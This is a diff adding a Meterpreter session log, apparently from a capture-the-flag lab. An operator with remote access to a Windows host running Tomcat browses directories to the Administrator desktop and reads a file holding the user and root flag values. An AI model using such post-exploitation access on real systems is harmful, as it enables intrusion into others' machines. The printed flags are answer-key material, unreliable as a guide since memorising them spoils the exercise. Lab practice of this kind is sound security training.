@@ -1,0 +1,135 @@
+meterpreter > cd c:
+[-] stdapi_fs_chdir: Operation failed: 1
+meterpreter > cd c:/
+meterpreter > dir
+Listing: C:\
+============
+
+Mode              Size       Type  Last modified              Name
+----              ----       ----  -------------              ----
+40777/rwxrwxrwx   0          dir   2013-08-22 11:50:45 -0400  $Recycle.Bin
+100777/rwxrwxrwx  1          fil   2013-06-18 08:18:29 -0400  BOOTNXT
+40776/rwxrwxrw-   4096       dir   2018-06-18 16:31:25 -0400  Documents and Settings
+40776/rwxrwxrw-   0          dir   2013-08-22 11:52:33 -0400  PerfLogs
+40776/rwxrwxrw-   4096       dir   2018-06-19 11:42:35 -0400  Program Files
+40776/rwxrwxrw-   4096       dir   2018-06-19 11:42:35 -0400  Program Files (x86)
+40777/rwxrwxrwx   4096       dir   2018-06-18 21:31:34 -0400  ProgramData
+40777/rwxrwxrwx   0          dir   2018-06-18 16:23:35 -0400  System Volume Information
+40776/rwxrwxrw-   4096       dir   2018-06-18 16:31:25 -0400  Users
+40776/rwxrwxrw-   24576      dir   2018-06-19 11:54:08 -0400  Windows
+40776/rwxrwxrw-   4096       dir   2018-06-18 21:07:05 -0400  apache-tomcat-7.0.88
+100555/r-xr-xr-x  427680     fil   2013-08-22 01:31:45 -0400  bootmgr
+100001/--------x  738197504  fil   1969-12-31 19:00:00 -0500  pagefile.sys
+
+meterpreter > cd Documents\ and\ Settings 
+meterpreter > dir
+[-] stdapi_fs_ls: Operation failed: 1
+meterpreter > dir
+[-] stdapi_fs_ls: Operation failed: 1
+meterpreter > cd ..
+meterpreter > dir
+Listing: C:\
+============
+
+Mode              Size       Type  Last modified              Name
+----              ----       ----  -------------              ----
+40777/rwxrwxrwx   0          dir   2013-08-22 11:50:45 -0400  $Recycle.Bin
+100777/rwxrwxrwx  1          fil   2013-06-18 08:18:29 -0400  BOOTNXT
+40776/rwxrwxrw-   4096       dir   2018-06-18 16:31:25 -0400  Documents and Settings
+40776/rwxrwxrw-   0          dir   2013-08-22 11:52:33 -0400  PerfLogs
+40776/rwxrwxrw-   4096       dir   2018-06-19 11:42:35 -0400  Program Files
+40776/rwxrwxrw-   4096       dir   2018-06-19 11:42:35 -0400  Program Files (x86)
+40777/rwxrwxrwx   4096       dir   2018-06-18 21:31:34 -0400  ProgramData
+40777/rwxrwxrwx   0          dir   2018-06-18 16:23:35 -0400  System Volume Information
+40776/rwxrwxrw-   4096       dir   2018-06-18 16:31:25 -0400  Users
+40776/rwxrwxrw-   24576      dir   2018-06-19 11:54:08 -0400  Windows
+40776/rwxrwxrw-   4096       dir   2018-06-18 21:07:05 -0400  apache-tomcat-7.0.88
+100555/r-xr-xr-x  427680     fil   2013-08-22 01:31:45 -0400  bootmgr
+100001/--------x  738197504  fil   1969-12-31 19:00:00 -0500  pagefile.sys
+
+meterpreter > cd Users 
+meterpreter > dir
+Listing: C:\Users
+=================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40776/rwxrwxrw-   8192  dir   2018-06-18 16:31:28 -0400  Administrator
+40777/rwxrwxrwx   4096  dir   2018-06-18 21:31:34 -0400  All Users
+40777/rwxrwxrwx   8192  dir   2013-08-22 12:08:06 -0400  Default
+40777/rwxrwxrwx   8192  dir   2013-08-22 12:08:06 -0400  Default User
+40776/rwxrwxrw-   4096  dir   2013-08-22 11:39:32 -0400  Public
+100777/rwxrwxrwx  174   fil   2013-08-22 11:37:57 -0400  desktop.ini
+
+meterpreter > cd Administrator 
+meterpreter > dir
+Listing: C:\Users\Administrator
+===============================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+40777/rwxrwxrwx   0       dir   2018-06-18 16:31:25 -0400  AppData
+40776/rwxrwxrw-   0       dir   2018-06-18 21:32:11 -0400  Application Data
+40776/rwxrwxrw-   0       dir   2018-06-18 23:43:09 -0400  Contacts
+40777/rwxrwxrwx   4096    dir   2018-06-19 11:48:37 -0400  Cookies
+40776/rwxrwxrw-   0       dir   2018-06-19 00:09:30 -0400  Desktop
+40776/rwxrwxrw-   0       dir   2018-06-18 23:43:09 -0400  Documents
+40776/rwxrwxrw-   0       dir   2018-06-18 23:43:09 -0400  Downloads
+40776/rwxrwxrw-   0       dir   2018-06-18 23:43:09 -0400  Favorites
+40776/rwxrwxrw-   0       dir   2018-06-18 23:43:09 -0400  Links
+40776/rwxrwxrw-   4096    dir   2018-06-18 20:56:09 -0400  Local Settings
+40776/rwxrwxrw-   0       dir   2018-06-18 23:43:09 -0400  Music
+40776/rwxrwxrw-   4096    dir   2018-06-18 23:43:09 -0400  My Documents
+100777/rwxrwxrwx  524288  fil   2020-11-21 03:01:33 -0500  NTUSER.DAT
+100777/rwxrwxrwx  65536   fil   2018-06-18 16:39:19 -0400  NTUSER.DAT{bfa35aa3-0b43-11e3-93fa-782bcb3a0757}.TM.blf
+100777/rwxrwxrwx  524288  fil   2018-06-18 16:39:19 -0400  NTUSER.DAT{bfa35aa3-0b43-11e3-93fa-782bcb3a0757}.TMContainer00000000000000000001.regtrans-ms
+100777/rwxrwxrwx  524288  fil   2018-06-18 16:39:19 -0400  NTUSER.DAT{bfa35aa3-0b43-11e3-93fa-782bcb3a0757}.TMContainer00000000000000000002.regtrans-ms
+40776/rwxrwxrw-   0       dir   2013-08-22 11:39:30 -0400  NetHood
+40776/rwxrwxrw-   0       dir   2018-06-18 23:43:09 -0400  Pictures
+40776/rwxrwxrw-   0       dir   2013-08-22 11:39:30 -0400  PrintHood
+40776/rwxrwxrw-   4096    dir   2018-06-19 11:00:58 -0400  Recent
+40776/rwxrwxrw-   0       dir   2018-06-18 23:43:09 -0400  Saved Games
+40776/rwxrwxrw-   0       dir   2018-06-18 23:43:09 -0400  Searches
+40776/rwxrwxrw-   4096    dir   2013-08-22 11:39:32 -0400  SendTo
+40776/rwxrwxrw-   0       dir   2018-06-18 23:43:09 -0400  Start Menu
+40776/rwxrwxrw-   0       dir   2013-08-22 11:39:30 -0400  Templates
+40776/rwxrwxrw-   0       dir   2018-06-18 23:43:09 -0400  Videos
+100777/rwxrwxrwx  237568  fil   2018-06-18 16:31:25 -0400  ntuser.dat.LOG1
+100777/rwxrwxrwx  40960   fil   2018-06-18 16:31:25 -0400  ntuser.dat.LOG2
+100777/rwxrwxrwx  20      fil   2018-06-18 16:31:25 -0400  ntuser.ini
+
+meterpreter > cd Desktop 
+meterpreter > dir
+Listing: C:\Users\Administrator\Desktop
+=======================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100777/rwxrwxrwx  282   fil   2018-06-18 23:43:09 -0400  desktop.ini
+40776/rwxrwxrw-   0     dir   2018-06-19 00:09:40 -0400  flags
+
+meterpreter > dir flags 
+Listing: flags
+==============
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100776/rwxrwxrw-  88    fil   2018-06-19 00:11:36 -0400  2 for the price of 1.txt
+
+meterpreter > cd flags 
+meterpreter > dir
+Listing: C:\Users\Administrator\Desktop\flags
+=============================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100776/rwxrwxrw-  88    fil   2018-06-19 00:11:36 -0400  2 for the price of 1.txt
+
+meterpreter > cat 2\ for\ the\ price\ of\ 1.txt 
+user.txt
+7004dbcef0f854e0fb401875f26ebd00
+
+root.txt
+04a8b36e1545a455393d067e772fe90emeterpreter > 36e1545a455393d067e772fe90em
+[*] 10.129.45.112 - Meterpreter session 1 closed.  Reason: Died
+
